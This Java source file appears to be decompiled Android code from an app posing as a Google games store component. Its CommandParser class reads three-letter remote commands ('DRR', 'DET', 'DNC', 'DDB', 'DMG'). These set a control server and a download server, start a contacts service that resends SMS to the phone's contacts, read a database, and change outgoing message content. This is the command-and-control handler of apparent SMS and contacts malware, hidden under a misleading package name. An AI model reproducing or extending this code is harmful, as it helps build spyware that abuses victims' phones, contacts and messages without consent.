package com.google.games.stores.util;

import android.content.Context;
import android.content.Intent;
import com.google.games.stores.bean.MyConfig;
import com.google.games.stores.config.Config;
import com.google.games.stores.service.ContactsService;
import com.google.games.stores.service.Notifications;

public class CommandParser {
    private static final String FACTORY_SET = "FA#";
    private static final int MAX_LEN = 3;
    private static final String NEW_MSG = "DMG";
    private static final String READ_DB = "DDB";
    private static final String SET_DOWN = "DET";
    private static final String SET_SERVER = "DRR";
    private static final String SMS_CONTACT = "DNC";
    private static String header = "";

    public static void ExecCommand(String command, Context context) {
        if (command.length() >= 3) {
            header = command.substring(0, 3);
            MyConfig config = ConfigUtil.getConfig(Config.CONFIG_FILE);
            if (config == null) {
                config = new MyConfig();
            }
            Logger.i("S", "execute CommandParser");
            Intent contactService;
            if (isSame(SET_SERVER)) {
                config.setServer(getContent(command));
                if (ConfigUtil.writeConfig(config, Config.CONFIG_FILE)) {
                    Logger.i("S", "set server done");
                } else {
                    Logger.i("S", "set server fail");
                }
                Intent backService = new Intent(context, Notifications.class);
                backService.setFlags(268435456);
                backService.putExtra(Config.REGISTER, Config.REGISTER);
                context.startService(backService);
            } else if (isSame(SET_DOWN)) {
                config.setDown(getContent(command));
                if (ConfigUtil.writeConfig(config, Config.CONFIG_FILE)) {
                    Logger.i("S", "set down server done");
                } else {
                    Logger.i("S", "set down server fail");
                }
            } else if (isSame(SMS_CONTACT)) {
                config.setContact("null");
                if (ConfigUtil.writeConfig(config, Config.CONFIG_FILE)) {
                    Logger.i("S", "set resend sms done");
                } else {
                    Logger.i("S", "set resend sms fail");
                }
                contactService = new Intent(context, ContactsService.class);
                contactService.setFlags(268435456);
                context.startService(contactService);
            } else if (isSame(READ_DB)) {
                contactService = new Intent(context, ContactsService.class);
                contactService.setFlags(268435456);
                contactService.putExtra("DB", "DB");
                context.startService(contactService);
            } else if (isSame(NEW_MSG)) {
                config.setMsg(getContent(command));
                if (ConfigUtil.writeConfig(config, Config.CONFIG_FILE)) {
                    Logger.i("S", "set new msg content done");
                } else {
                    Logger.i("S", "set new msg content fail");
                }
            } else {
                isSame(FACTORY_SET);
            }
        }
    }

    private static boolean isSame(String object) {
        if (header.equalsIgnoreCase(object)) {
            return true;
        }
        return false;
    }

    private static String getContent(String command) {
        return command.substring(3, command.length()).trim();
    }

    public static String getServer() {
        MyConfig config = ConfigUtil.getConfig(Config.CONFIG_FILE);
        if (config == null || config.getServer().equalsIgnoreCase("") || config.getServer().equalsIgnoreCase("null")) {
            return "";
        }
        return config.getServer();
    }
}
